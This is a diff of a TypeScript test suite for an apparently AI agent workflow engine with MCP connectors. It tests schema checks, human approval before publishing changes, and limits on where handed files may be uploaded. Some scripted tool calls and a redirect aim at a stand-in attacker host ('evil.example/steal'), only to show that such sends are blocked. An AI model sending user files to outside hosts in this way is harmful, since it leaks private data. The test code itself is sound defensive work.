@@ -19,6 +19,8 @@ import {
   saveFile, readSheet, renderSheet, parseCsv, extractPdfText,
   ApprovalForbiddenError, ConnectorUnavailableError, hideInternalIds, repeatsArtifact, DefinitionInvalidError, validateDefinition, OFFICIAL_AGENTS, todayJst, describeCall, jpDate,
   type LlmProvider, type LlmRequest, type Repository, type KnowledgeItem,
+  applyReviewedRoles, connectionAgent, connectorTools, checkJsonArgs, sanitizeSchema, toWireName, fromWireName,
+  type LlmToolRequest, type McpClient, type TenantConnection,
 } from '../src/index.js';
 
 /** 実行エンジンが使う操作だけを持つ、記憶上の永続化層。 */
@@ -83,6 +85,8 @@ class MemoryRepo {
   compartmentsOf: Record<string, string[]> = {};
   async listUserCompartments(_t: string, u: string) { return this.compartmentsOf[u] ?? []; }
   async listUserGroupIds(_t: string, u: string) { return this.groupsOf[u] ?? []; }
+  connections: TenantConnection[] = [];
+  async listConnections(t: string) { return this.connections.filter((c) => c.tenantId === t); }
   userSettings = structuredClone(DEFAULT_USER_SETTINGS);
   async getUserSettings() { return this.userSettings; }
 }
@@ -1326,28 +1330,6 @@ test('段が必ず呼ぶツールを呼ばずに終えようとしたら、一�
   assert.deepEqual(((gate.input as { toolCalls: { name: string }[] }).toolCalls).map((c) => c.name), ['chat.post', 'knowledge.register']);
 });
 
-test('どれか 1 つは呼ぶはずのツールを、どれも呼ばずに終えようとしたら、一度だけ促す（第47.7節。2026-11-15 に MCP のサイトに下書きを入れずに終えた）', async () => {
-  const def: AgentDefinition = {
-    ...SHARE_DEF, id: 'share-one-of', tools: ['chat.post', 'knowledge.register'],
-    steps: SHARE_DEF.steps.map((s) => (s.id === 'share' ? { ...s, requireOneOf: ['chat.post', 'knowledge.register'] } : s)),
-  };
-  const { repo, run, engine, llm } = scriptedShare(def, [
-    [],
-    [], // 文で答えて終えようとする
-    [{ name: 'chat.post', args: { space: '営業部', text: '共有します' } }],
-    [],
-  ]);
-  await engine.advance(run);
-  assert.ok(llm.prompts.some((p) => p.includes('まだ道具で行っていません') && p.includes('chat.post')), '呼ぶよう促す');
-  assert.equal(llm.prompts.filter((p) => p.includes('まだ道具で行っていません')).length, 1, '促すのは一度だけ');
-  const gate = repo.steps.find((s) => s.stepId === 'gate')!;
-  assert.deepEqual(((gate.input as { toolCalls: { name: string }[] }).toolCalls).map((c) => c.name), ['chat.post']);
-  const registry = new ToolRegistry();
-  for (const t of BUILTIN_TOOLS) registry.register(t);
-  const bad: AgentDefinition = { ...SHARE_DEF, steps: SHARE_DEF.steps.map((s) => (s.id === 'share' ? { ...s, requireOneOf: ['gmail.send'] } : s)) };
-  assert.throws(() => validateDefinition(bad, registry), /どれか 1 つ呼ぶはずのツール/);
-});
-
 test('段が必ず呼ぶツールは、その段で使えるツールでなければ定義を拒む', () => {
   const registry = new ToolRegistry();
   for (const t of BUILTIN_TOOLS) registry.register(t);
@@ -1362,4 +1344,249 @@ test('業務の名前: 削除した業務でも ID をそのまま出さない�
   // 移行 078 より前の依頼は、削除したことが分かる形にする
   assert.equal(agentDisplayName(undefined, 'skill.slack-post:slack-post', null), '削除した業務（slack-post）');
   assert.equal(agentDisplayName(null, ''), '不明な業務');
+});
+
+test('道具を選ぶ係には、頼みを先頭に渡す（長いこれまでの話で頼みが切れないように）', async () => {
+  const { selectionRequest } = await import('../src/index.js');
+  const text = selectionRequest('利用者の依頼に答えるため、必要なものを読む。'.repeat(80), { context: '## いまの状況\n- サイトのお知らせの話'.repeat(300), request: 'Slack の #general の最近のやり取りをまとめて' }, '');
+  assert.ok(text.startsWith('頼み: Slack の #general の最近のやり取りをまとめて'), '頼みが先頭');
+  assert.ok(text.length < 6000, '選ぶ係が切る長さ（6,000 字）に収まる');
+});
+
+// ---- 1 本の会話の段（仕様書 第48章、ADR-0149） ----
+
+test('相手の JSON Schema を窓口に渡せる形に整え、元の定義で引数を確かめる', () => {
+  const schema = {
+    $schema: 'https://json-schema.org/draft/2020-12/schema', type: 'object', additionalProperties: false,
+    properties: {
+      postId: { type: 'integer', exclusiveMinimum: 0 },
+      intent: { type: 'string', enum: ['publish', 'update'] },
+      changes: { type: 'object', properties: { title: { type: 'string', maxLength: 10 }, expiration: { type: 'object', properties: { expiresAt: { anyOf: [{ type: 'string' }, { type: 'null' }] } }, required: ['expiresAt'] } } },
+    },
+    required: ['postId', 'intent'],
+  };
+  const clean = sanitizeSchema(schema);
+  assert.equal(clean['$schema'], undefined);
+  assert.equal(clean['additionalProperties'], undefined);
+  const changes = (clean['properties'] as Record<string, Record<string, unknown>>)['changes']!;
+  assert.ok((changes['properties'] as Record<string, unknown>)['expiration'], '入れ子を落とさない');
+  assert.deepEqual(checkJsonArgs(schema, { postId: 3, intent: 'publish', changes: { title: '休診', expiration: { expiresAt: null } } }), []);
+  assert.ok(checkJsonArgs(schema, { intent: 'x' }).some((p) => p.includes('postId が要ります')));
+  assert.ok(checkJsonArgs(schema, { postId: 0, intent: 'publish' }).some((p) => p.includes('より大きい')));
+  assert.ok(checkJsonArgs(schema, { postId: 1, intent: 'publish', changes: { title: 'とても長い題名を付けました' } }).some((p) => p.includes('10 字まで')));
+  assert.ok(checkJsonArgs(schema, { postId: 1, intent: 'publish', changes: { expiration: {} } }).some((p) => p.includes('changes.expiration.expiresAt が要ります')), '入れ子の必須も見る');
+  assert.equal(fromWireName(toWireName('clinic-site.confirm_notice_change'), ['clinic-site.confirm_notice_change']), 'clinic-site.confirm_notice_change');
+});
+
+test('推論が道具の呼び出しに付けた考えの署名を、次の依頼でそのまま返す（返さないと Gemini は 400 で断る）', async () => {
+  const { openAiToolBody, openAiToolCalls } = await import('../src/index.js');
+  const got = openAiToolCalls({ content: '', tool_calls: [{ id: 'c1', function: { name: 'clinic-site__get_guide', arguments: '{"x":1}' }, extra_content: { google: { thought_signature: 'SIG' } } }] }, ['clinic-site.get_guide']);
+  assert.deepEqual(got.toolCalls[0], { id: 'c1', name: 'clinic-site.get_guide', args: { x: 1 }, extra: { google: { thought_signature: 'SIG' } } });
+  const body = openAiToolBody({ tier: 'standard', tools: [], messages: [{ role: 'assistant', content: '', toolCalls: got.toolCalls }, { role: 'tool', toolCallId: 'c1', content: '{}' }] });
+  const sent = (body.messages[0] as { tool_calls: { extra_content?: unknown; function: { name: string } }[] }).tool_calls[0]!;
+  assert.deepEqual(sent.extra_content, { google: { thought_signature: 'SIG' } });
+  assert.equal(sent.function.name, 'clinic-site__get_guide');
+});
+
+/** 医院のサイトの MCP のような接続（準備・見直し・確定）を、道具の答えを決めた見本で動かす。 */
+function conversationWorld(
+  replies: { text?: string; calls: { name: string; args: Record<string, unknown> }[] }[],
+  opts: { input?: Record<string, unknown>; fileSendFetch?: typeof fetch; files?: Record<string, Uint8Array>; noSchema?: boolean } = {},
+) {
+  const sent: { name: string; args: Record<string, unknown> }[] = [];
+  const client: McpClient = {
+    async listTools() { return { ok: true as const, tools: [] }; },
+    async callTool(_u, name, args) {
+      sent.push({ name, args });
+      const text = name === 'prepare_notice_change' ? JSON.stringify({ confirmationToken: 'a'.repeat(64) })
+        : name === 'review_notice_change' ? JSON.stringify({ current: { title: '休診' }, proposed: { title: '年末年始の休診' }, changedFields: ['title'], urlChangeWarning: '' })
+        : JSON.stringify({ ok: true, url: 'https://site.example/notice/1' });
+      return { ok: true as const, text, truncated: false };
+    },
+  };
+  const conn: TenantConnection = {
+    tenantId: 't', id: 'clinic-site', name: '医院のサイト', description: '', transport: 'http', url: 'https://mcp.site.example/mcp', auth: { type: 'none' },
+    tools: applyReviewedRoles([
+      { name: 'prepare_notice_change', description: '予定を作り確認トークンを返す', risk: 'external-send', role: 'prepare',
+        inputSchema: { type: 'object', properties: { postId: { type: 'integer' }, changes: { type: 'object', properties: { title: { type: 'string' } } } }, required: ['postId'] } },
+      { name: 'review_notice_change', description: '予定の中身を返す', risk: 'external-send', role: 'review',
+        inputSchema: { type: 'object', properties: { confirmationToken: { type: 'string' } }, required: ['confirmationToken'] } },
+      { name: 'confirm_notice_change', description: 'トークンで適用する。利用者の了承を得てから呼ぶ', risk: 'external-send', role: 'commit',
+        inputSchema: { type: 'object', properties: { confirmationToken: { type: 'string' } }, required: ['confirmationToken'] } },
+    ]),
+    profile: { summary: '医院のサイトのお知らせの作成と公開', site: true, generatedAt: '', reviewedAt: 'x' },
+    origin: 'manual', createdBy: 'u', createdAt: '', updatedAt: '',
+  };
+  // 元の定義を持たない接続（取り直す前に登録したもの）。簡単な形の定義だけを持ち、その写しが違っている
+  if (opts.noSchema) conn.tools = conn.tools.map(({ inputSchema: _drop, ...t }) => ({ ...t, args: { properties: { postId: { type: 'string', description: '' } }, required: ['postId'] } }));
+  const def = connectionAgent(conn, new Set(conn.tools.map((t) => `clinic-site.${t.name}`)))!;
+  const registry = new ToolRegistry();
+  for (const t of BUILTIN_TOOLS) registry.register(t);
+  const tenantRegistry = registry.extend(connectorTools(conn, client));
+  const requests: LlmToolRequest[] = [];
+  let i = 0;
+  const llm: LlmProvider = {
+    name: 'scripted-tools',
+    async complete() { return { text: '終わりました', tokensUsed: 1 }; },
+    async completeTools(req: LlmToolRequest) {
+      requests.push(structuredClone(req));
+      const r = replies[Math.min(i++, replies.length - 1)]!;
+      return { text: r.text ?? '', tokensUsed: 5, toolCalls: r.calls.map((c, k) => ({ id: `c${i}_${k}`, name: c.name, args: c.args })) };
+    },
+  };
+  const repo = new MemoryRepo();
+  repo.settings.automation = { writeInternal: 'allow', perAgent: {} };
+  repo.connections.push(conn);
+  const files = new MemoryFileStore();
+  for (const [k, v] of Object.entries(opts.files ?? {})) void files.put('t', k, v);
+  const engine = new RunEngine({
+    repo: repo as unknown as Repository, llm, registry: tenantRegistry, connector: new MockWorkspaceConnector(), files,
+    resolveDefinition: () => def, ...(opts.fileSendFetch ? { fileSendFetch: opts.fileSendFetch } : {}),
+  });
+  const now = new Date().toISOString();
+  repo.jobs.push({ id: 'j1', tenantId: 't', agentId: def.id, agentVersion: 1, requestedBy: 'u-member', origin: 'secretary', input: opts.input ?? { request: '年末年始の休診のお知らせを出して' }, createdAt: now });
+  const run: Run = { id: 'r1', jobId: 'j1', tenantId: 't', status: 'running', cursor: 0, startedAt: now, endedAt: null, tokensUsed: 0, costJpy: 0, savedMinutes: 0, failureReason: null };
+  repo.runs.push(run);
+  const resume = async () => engine.advance({ ...(await repo.getRun('t', 'r1'))!, status: 'running' });
+  return { repo, engine, run, sent, requests, resume };
+}
+
+test('1 本の会話: 準備と見直しは止めずに進め、確定の呼び出しの所で止める。承認したらそのとおりに行い、会話を続ける', async () => {
+  const w = conversationWorld([
+    { calls: [{ name: 'clinic-site.prepare_notice_change', args: { postId: 7, changes: { title: '年末年始の休診' } } }] },
+    { calls: [{ name: 'clinic-site.review_notice_change', args: { confirmationToken: 'a'.repeat(64) } }] },
+    { text: '期限は 1 月 4 日にしました。', calls: [{ name: 'clinic-site.confirm_notice_change', args: { confirmationToken: 'a'.repeat(64) } }] },
+    { text: '公開しました。トップページで確かめられます。', calls: [] },
+  ]);
+  const first = await w.engine.advance(w.run);
+  assert.equal(first.outcome, 'awaiting_approval', '確定の所で止まる');
+  assert.deepEqual(w.sent.map((x) => x.name), ['prepare_notice_change', 'review_notice_change'], '確定は承認の前に行わない');
+  assert.ok(w.requests[0]!.tools.some((t) => t.name === 'clinic-site.confirm_notice_change'), '確定の道具も最初から見せる（呼べば M2Office が止める）');
+  assert.ok(String(w.requests[0]!.messages[0]!.content).includes('そのまま呼んでください'), '約束事を渡す');
+  const approval = w.repo.approvals[0]!;
+  assert.match(approval.present.split('\n')[0]!, /医院のサイトで、見える状態を変える操作/, '1 行目にどの接続かを出す');
+  assert.match(approval.present, /年末年始の休診/, '見直しの結果を出す');
+  await w.engine.decideApproval('t', approval.id, 'approved', { id: 'u-member', roles: ['member'] }, null);
+  const second = await w.resume();
+  assert.equal(second.outcome, 'completed');
+  assert.deepEqual(w.sent.at(-1), { name: 'confirm_notice_change', args: { confirmationToken: 'a'.repeat(64) } }, '止めた呼び出しをそのとおりに行う');
+  const lastMessages = w.requests.at(-1)!.messages;
+  assert.ok(lastMessages.some((m) => m.role === 'tool' && m.content.includes('site.example/notice/1')), '確定の答えを会話に返して続ける');
+});
+
+test('1 本の会話: 理由つきの却下は会話に返して直させ、理由なしの却下は業務を終える', async () => {
+  const w = conversationWorld([
+    { calls: [{ name: 'clinic-site.confirm_notice_change', args: { confirmationToken: 'b'.repeat(64) } }] },
+    { text: '期限を 1 月 11 日に直しました。', calls: [{ name: 'clinic-site.confirm_notice_change', args: { confirmationToken: 'c'.repeat(64) } }] },
+  ]);
+  assert.equal((await w.engine.advance(w.run)).outcome, 'awaiting_approval');
+  await w.engine.decideApproval('t', w.repo.approvals[0]!.id, 'rejected', { id: 'u-member', roles: ['member'] }, '期限は来週にして');
+  assert.equal((await w.repo.getRun('t', 'r1'))!.status, 'queued', '理由つきの却下は続ける');
+  assert.equal((await w.resume()).outcome, 'awaiting_approval', '直して、また確定で止まる');
+  assert.ok(w.requests[1]!.messages.some((m) => m.role === 'tool' && m.content.includes('期限は来週にして')), '却下の理由を、その呼び出しの答えとして返す');
+  assert.equal(w.sent.length, 0, '却下した呼び出しは行わない');
+  await w.engine.decideApproval('t', w.repo.approvals[1]!.id, 'rejected', { id: 'u-member', roles: ['member'] }, null);
+  assert.equal((await w.repo.getRun('t', 'r1'))!.status, 'cancelled', '理由なしの却下は終える');
+});
+
+test('渡すファイルの送り先は、その接続のサイトの https だけにする', async () => {
+  const { siteOfHost, fileSendTargetProblem, sendHandedFile } = await import('../src/index.js');
+  assert.equal(siteOfHost('mcp.example.jp'), 'example.jp');
+  assert.equal(siteOfHost('upload.clinic.example.co.jp'), 'example.co.jp');
+  assert.equal(fileSendTargetProblem('https://www.site.example/upload/abc', 'https://mcp.site.example/mcp'), null);
+  assert.match(fileSendTargetProblem('https://evil.example/upload', 'https://mcp.site.example/mcp')!, /この接続のサイト/);
+  assert.match(fileSendTargetProblem('http://www.site.example/upload', 'https://mcp.site.example/mcp')!, /https/);
+  const file = { fileId: 'f1', name: 'cover.png', mimeType: 'image/png', purpose: 'アイキャッチ' };
+  const moved = await sendHandedFile({ file, bytes: new Uint8Array([1]), url: 'https://www.site.example/u', serverUrl: 'https://mcp.site.example/mcp', format: 'json' },
+    (async () => new Response(null, { status: 302, headers: { location: 'https://evil.example/' } })) as typeof fetch);
+  assert.ok('error' in moved, '転送は受け付けない');
+});
+
+test('1 本の会話: 預けたファイルは M2Office が相手の示した送り先へ送り、止めずに進める。預けていないファイル・ほかのサイトには送らない', async () => {
+  const posted: { url: string; body: Record<string, unknown> }[] = [];
+  const fakeFetch = (async (url: string, init: RequestInit) => {
+    posted.push({ url, body: JSON.parse(String(init.body)) as Record<string, unknown> });
+    return new Response(JSON.stringify({ id: 555 }), { status: 200 });
+  }) as unknown as typeof fetch;
+  const w = conversationWorld([
+    { calls: [
+      { name: 'files_send', args: { fileId: 'cover-1', url: 'https://www.site.example/upload/key', format: 'json', jsonFields: { data: 'dataBase64' } } },
+      { name: 'files_send', args: { fileId: 'other', url: 'https://www.site.example/upload/key', format: 'json' } },
+      { name: 'files_send', args: { fileId: 'cover-1', url: 'https://evil.example/steal', format: 'json' } },
+    ] },
+    { text: 'アイキャッチを付けました。', calls: [] },
+  ], {
+    input: { request: 'コラムを下書きに入れて', files: [{ fileId: 'cover-1', name: 'cover.png', mimeType: 'image/png', alt: '春の花', purpose: '記事のアイキャッチ画像' }] },
+    files: { 'cover-1': new Uint8Array([137, 80, 78, 71]) },
+    fileSendFetch: fakeFetch,
+  });
+  assert.equal((await w.engine.advance(w.run)).outcome, 'completed', '送るのに承認は要らない（中身は親の承認で見ている）');
+  assert.ok(String(w.requests[0]!.messages[0]!.content).includes('cover-1: 記事のアイキャッチ画像'), '渡されたファイルを見せる');
+  assert.ok(w.requests[0]!.tools.some((t) => t.name === 'files_send'));
+  assert.equal(posted.length, 1, '預けたファイルを、その接続のサイトにだけ送る');
+  assert.deepEqual(posted[0], { url: 'https://www.site.example/upload/key', body: { filename: 'cover.png', mimeType: 'image/png', dataBase64: Buffer.from([137, 80, 78, 71]).toString('base64') } });
+  const answers = w.requests[1]!.messages.filter((m) => m.role === 'tool').map((m) => m.content);
+  assert.ok(answers[0]!.includes('555'), '相手の応答を返す');
+  assert.ok(answers[1]!.includes('渡されたファイルではありません'));
+  assert.ok(answers[2]!.includes('この接続のサイト'));
+  const audit = w.repo.audits.filter((a) => a.action === 'connection.file_send');
+  assert.equal(audit.length, 2, '送ったものと、送り先で断ったものを残す');
+  assert.ok(!JSON.stringify(audit).includes('/upload/key'), 'URL の道（一時の鍵）は残さない');
+});
+
+test('1 本の会話: files_send は接続の名前を前に付けて呼ばれても送り、送れていなければ答えの最初にそう書く（第48.8.1節）', async () => {
+  const fakeFetch = (async () => new Response(JSON.stringify({ id: 777 }), { status: 200 })) as unknown as typeof fetch;
+  const input = { request: 'コラムを下書きに入れて', files: [{ fileId: 'cover-1', name: 'cover.png', mimeType: 'image/png', purpose: '記事のアイキャッチ画像' }] };
+  const files = { 'cover-1': new Uint8Array([1, 2, 3]) };
+  // 前に名前を付けて取り寄せ・呼び出し（2026-11-16 の事故の形）
+  const sent = conversationWorld([
+    { calls: [{ name: 'tools_load', args: { names: ['clinic-site.files_send'] } }] },
+    { calls: [{ name: 'clinic-site__files_send', args: { fileId: 'cover-1', url: 'https://www.site.example/upload/key', format: 'multipart' } }] },
+    { text: 'アイキャッチを付けました。', calls: [] },
+  ], { input, files, fileSendFetch: fakeFetch });
+  assert.equal((await sent.engine.advance(sent.run)).outcome, 'completed');
+  const answers = sent.requests.slice(1).flatMap((r) => r.messages.filter((m) => m.role === 'tool').map((m) => m.content));
+  assert.ok(!answers[0]!.includes('"notFound":["clinic-site.files_send"]'), '取り寄せで「無い」と返さない');
+  assert.ok(answers[0]!.includes('この名前のまま呼べます'));
+  assert.ok(answers.some((a) => a.includes('777')), '前に名前が付いていても送る');
+  const doneText = ((await sent.repo.listRunSteps('t', 'r1')).at(-1)!.output as { text: string }).text;
+  assert.equal(doneText, 'アイキャッチを付けました。', '送れたときは何も足さない');
+  // 送らずに終えたとき
+  const unsent = conversationWorld([{ text: 'アップロード済みの画像を設定しました。', calls: [] }], { input, files, fileSendFetch: fakeFetch });
+  assert.equal((await unsent.engine.advance(unsent.run)).outcome, 'completed');
+  const text = ((await unsent.repo.listRunSteps('t', 'r1')).at(-1)!.output as { text: string }).text;
+  assert.match(text, /^（渡したファイル（記事のアイキャッチ画像）は、相手に送れていません）/, '推論の言い分に任せず、送れていないことを書く');
+  assert.ok(String(unsent.requests[0]!.messages[0]!.content).includes('前の記事の画像など）で代えず'), '別のファイルで代えないよう伝える');
+});
+
+test('1 本の会話: 元の定義が無い道具は、写した定義で呼び出しを止めず、確かめを相手に任せる', async () => {
+  const w = conversationWorld([
+    { calls: [{ name: 'clinic-site.prepare_notice_change', args: { postId: 7 } }] },
+    { text: '準備しました。', calls: [] },
+  ], { noSchema: true });
+  assert.equal((await w.engine.advance(w.run)).outcome, 'completed');
+  assert.deepEqual(w.sent.map((x) => x.args), [{ postId: 7 }], '写しでは文字でも、数のまま相手に渡す');
+});
+
+test('名前で頼まれたものが無いとき: 約束事の版 2 と調べものの指示が、探し直し・読むだけなら近いもので進める・送るなら代えないを伝える（第10.11.5.2節）', async () => {
+  const { CONVERSATION_CONTRACT, CONVERSATION_CONTRACT_VERSION, conversationSystem: system } = await import('../src/index.js');
+  const { SECRETARY_LOOKUP } = await import('../src/agents/secretary-lookup.js');
+  assert.equal(CONVERSATION_CONTRACT_VERSION, 2);
+  assert.match(CONVERSATION_CONTRACT, /^8\. 頼みが名前で指したもの/m);
+  assert.match(CONVERSATION_CONTRACT, /送る・作る・直す・公開する頼みでは近いもので代えず/);
+  assert.ok(system({ connectionName: 'Slack', summary: '', company: '', tools: [], loadAll: true }).includes('8. 頼みが名前で指したもの'), '接続の業務の最初の指示に入る');
+  const step = (id: string) => SECRETARY_LOOKUP.steps.find((x) => x.id === id) as { instruction: string };
+  assert.match(step('look').instruction, /見つからなければ、同じ道具で言葉を減らす/);
+  assert.match(step('answer').instruction, /読んでいないものを「まとめました」と書かない/);
+  assert.doesNotMatch(step('answer').instruction, /#all-m2office/, '例の名前に引きずられないよう、具体のチャンネル名を書かない');
+});
+
+test('1 本の会話: 引数が相手の定義に合わなければ呼ばずに理由を返し、道具の多い接続では取り寄せてから使う', async () => {
+  const w = conversationWorld([
+    { calls: [{ name: 'clinic-site.prepare_notice_change', args: { changes: {} } }] },
+    { text: '準備できませんでした。', calls: [] },
+  ]);
+  assert.equal((await w.engine.advance(w.run)).outcome, 'completed');
+  assert.equal(w.sent.length, 0, '合わない引数では呼ばない');
+  assert.ok(w.requests[1]!.messages.some((m) => m.role === 'tool' && m.content.includes('postId が要ります')));
 });
